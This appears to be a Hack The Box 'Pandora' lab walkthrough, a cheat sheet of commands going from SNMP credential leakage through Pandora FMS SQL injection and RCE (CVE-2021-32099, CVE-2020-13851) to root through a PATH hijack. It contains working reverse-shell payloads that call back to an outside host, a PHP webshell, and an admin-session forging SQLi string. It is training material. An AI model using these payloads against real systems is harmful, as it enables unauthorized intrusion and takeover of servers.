**HTB: Pandora - Command Reference**

---

### 🧰 Recon Phase

**Nmap TCP Full Range Scan:**
```bash
nmap -p- --min-rate 10000 10.10.11.136
```

**Nmap Service Version Scan:**
```bash
nmap -p 22,80 -sCV 10.10.11.136
```

**UDP Scan for SNMP:**
```bash
sudo nmap -sU -top-ports=100 10.10.11.136
```

**Feroxbuster Directory Fuzzing:**
```bash
feroxbuster -u http://10.10.11.136
```

**[WFuzz](HTTP) Subdomain Discovery:**
```bash
wfuzz -u http://panda.htb -H "Host: FUZZ.panda.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --hh 33560
```

**[SNMP](SNMP) Enumeration:**
```bash
snmpwalk -v 2c -c public 10.10.11.136 | tee snmp-full
snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 > snmp-full-bulk
```

**Custom Process Parsing (Python):**
```python
# snmp_processlist.py (dataclass and regex-based parser)
```

---

### 🚪 Initial Access

**Extracted from SNMP:**
```
Username: daniel
Password: HotelBabylon23
```

**[SSH](SSH) into Box:**
```bash
sshpass -p 'HotelBabylon23' ssh daniel@10.10.11.136
```

**Port Forward Pandora Console:**
```bash
ssh -L 9001:localhost:80 daniel@10.10.11.136
```

---

### 🩷 SQL Injection (CVE-2021-32099)

**Check SQLi Error:**
```
http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?session_id='
```

**Union Test (3 Columns):**
```
?session_id=' union select 1,2,3-- -
```

**SQLMap Discovery:**
```bash
sqlmap -u 'http://pandora.panda.htb:9001/pandora_console/include/chart_generator.php?session_id=1'
```

**Dump Pandora Sessions:**
```bash
sqlmap -D pandora -T tsessions_php --dump --where "data<>''"
```

**Replay Session (Replace Cookie):**
```http
Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq
```

---

### 🔨 Remote Code Execution (RCE #1: CVE-2020-13851)

**Exploit via Ajax:**
```http
POST /pandora_console/ajax.php
Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq

page=include/ajax/events&perform_event_response=10000000&target=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"&response_id=1
```

**Listener:**
```bash
nc -nvlp 443
```

**Shell Upgrade:**
```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset
```

---

### 🔨 Remote Code Execution (RCE #2: Admin Upload via SQLi)

**Crafted Payload for Admin Session:**
```url
http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=' union select '1','2','id_usuario|s:5:"admin";' -- a
```

**Upload Webshell (PHP):**
```php
<?php system($_REQUEST['cmd']); ?>
```

**Execute Reverse Shell via Webshell:**
```bash
curl 'http://pandora.panda.htb:9001/pandora_console/images/0xdf.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/443+0>%261"'
```

---

### 💼 Privilege Escalation to root

**SUID Binary Discovered:**
```bash
find / -perm -4000 -ls 2>/dev/null | grep pandora_backup
```

**Drop SSH Key to Ensure Clean Env:**
```bash
echo "<pub_key>" > /home/matt/.ssh/authorized_keys
```

**Confirm pandora_backup Vulnerability:**
```bash
ltrace pandora_backup
```

**Hijack tar via PATH:**
```bash
cd /dev/shm
export PATH=/dev/shm:$PATH

cat > tar << 'EOF'
#!/bin/bash
bash
EOF

chmod +x tar
pandora_backup
```

**Grab root flag:**
```bash
cat /root/root.txt
```

---

### 🕵️‍♂️ Beyond Root (Apache mpm-itk Sandbox Bypass)

- Apache site runs as `matt` via `AssignUserID` (from `mpm-itk` module).
- This breaks all SUID functionality under Apache execution tree.
- Switching to SSH avoids `mpm-itk` sandbox, allowing SUID execution.

**References:**
- https://mpm-itk.sesse.net/
- https://www.cpanel.net/support/
- https://serverfault.com/questions/1013897/setuid-scripts-fail-under-apache-mpm-itk

---

**Status:**
- User: `daniel` via SNMP creds
- Lateral: `matt` via Pandora FMS SQLi
- Root: `pandora_backup` path hijack

Great practice for SNMP enumeration, SQLi chaining, Apache mod understanding, and privilege escalation via PATH hijack ✨